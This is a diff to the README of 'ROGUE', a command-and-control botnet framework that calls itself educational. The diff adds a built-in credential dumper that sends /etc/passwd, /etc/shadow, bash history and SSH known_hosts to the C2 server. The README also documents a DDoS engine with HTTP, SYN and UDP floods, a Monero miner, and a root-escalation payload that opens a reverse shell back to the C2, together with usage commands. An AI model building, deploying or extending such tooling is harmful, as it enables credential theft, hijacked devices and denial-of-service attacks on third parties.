@@ -2,10 +2,10 @@
 
 ![rogue banner](https://github.com/user-attachments/assets/7dd2e5a3-398a-4487-a46b-541673b0f3b3)
 
-ROGUE is a customizable, educational & manually-deployed command-and-control (C2) botnet framework built for secure multi-device orchestration. 
+ROGUE is a customizable, educational & manually-deployed command-and-control (C2) botnet framework built for secure multi-device orchestration.  
 It supports encrypted communication using AES, with optional peer-to-peer fallback if the primary C2 is unreachable.  
 ROGUE supports implants on Linux, Raspberry Pi, Termux (Android), and iOS environments.  
-This botnet is intended as a learning tool. 
+This botnet is intended as a learning tool.  
 It comes with real-world ideas and examples to inspire tinkering, experimentation, and growth.  
 Have fun.
 
@@ -33,14 +33,14 @@ sudo apt install python3-pycryptodome
 ## File Structure
 
 * `rogue_c2.py` – Encrypted command-and-control server
+
 * `rogue_implant.py` – Bot implant for manual deployment with trigger handling, payload loader, and stealth logic
 
 * `payloads/` – Folder containing executable modules such as:
 
   * `mine.py`: Real CPU-based cryptocurrency miner
-  * `ddos.py`: Threaded DDoS engine with HTTP, TCP SYN, and UDP floods. now with continous mode xo.
+  * `ddos.py`: Threaded DDoS engine with HTTP, TCP SYN, and UDP floods. now with continuous mode xo.
   * `polyroot.py`: Privilege escalation and root persistence payload (see below)
-
 
 ---
 
@@ -127,9 +127,10 @@ trigger_mine
 trigger_ddos
 trigger_polyroot
 trigger_exfil <default|deep|/path>
+trigger_dumpcreds
 ```
 
-These will instruct all bots to fetch and execute the specified payload or exfil logic automatically.
+These will instruct all bots to fetch and execute the specified payload or internal logic automatically.
 
 ---
 
@@ -151,9 +152,35 @@ run_payload ddos.py trigger_ddos 192.168.0.99 80 60 150 http
 
 ---
 
+## 🔐 Credential Dumper (Built-In)
+
+The `trigger_dumpcreds` command is handled **inside the implant itself**, not as an external payload.
+
+```bash
+trigger_dumpcreds
+```
+
+### What it collects:
+
+* `/etc/passwd`
+* `/etc/shadow` (if readable)
+* `.bash_history`
+* `.ssh/known_hosts`
+
+These are zipped, AES-encrypted, and streamed back to the C2 server.
+They are auto-decrypted and saved as:
+
+```bash
+exfil_dec_<ip>_<timestamp>_creds.zip
+```
+
+This is ideal for credential hygiene testing, password auditing, and simulating lateral recon behavior.
+
+---
+
 ### Exfiltration Modes
 
-Rogue includes encrypted file and folder exfiltration using AES-secured zip archives. Output is auto-decrypted by the C2 and saved with timestamps.
+ROGUE includes encrypted file and folder exfiltration using AES-secured zip archives. Output is auto-decrypted by the C2 and saved with timestamps.
 
 | Command                     | Description                                                   |
 | --------------------------- | ------------------------------------------------------------- |
@@ -192,9 +219,11 @@ exfil_dec_<ip>_<timestamp>.zip
 When `polyroot.py` executes successfully and root escalation is achieved, it:
 
 * Drops a polymorphic SUID payload
+  
 * Attempts to initiate a reverse shell connection back to the Rogue C2
 
 The C2 IP is taken from the environment variable `ROGUE_C2_HOST` (or defaults to `127.0.0.1`)
+
 The callback connects to port `9001`
 
 Tip: Always start a listener before triggering the payload:
@@ -245,12 +274,12 @@ Best served over port 8000 like other payloads.
 
 * Monero miner with thread config
 * Supports pool/wallet input
-* Edit with your Cakewallet address
+* Edit with your Cakewallet address. get cakewallet here https://cakewallet.com/
 
 ### `ddos.py`
 
 * Supports HTTP, TCP SYN, UDP
-* Includes Tor routing (set `USE_TOR = True`)
+* Includes Tor routing (set `USE_TOR = True`) see steps below for tor instructions.
 * Threaded with flood duration control
 
 ### `polyroot.py`
@@ -302,10 +331,8 @@ python3 ddos.py trigger_ddos <target> <port> <duration> <threads> <mode>
 * Add signed commands
 * Auto-updating implants
 * Domain fronting (Ngrok, Cloudflare Workers)
-* DNS flux with DuckDNS or No-IP
-* GitHub Gist command polling
 * Discord-based command channels
-* Add support for windows
+* Add support for Windows
 * Write implant in C
 
 ---
@@ -318,3 +345,4 @@ Never use ROGUE on systems you do not **own or have permission** to test.
 All code is provided as-is, without warranty or support.
 
 ![rogue banner](https://github.com/user-attachments/assets/f07a8780-9551-4eda-8dd1-bb797d1d08b9)
+
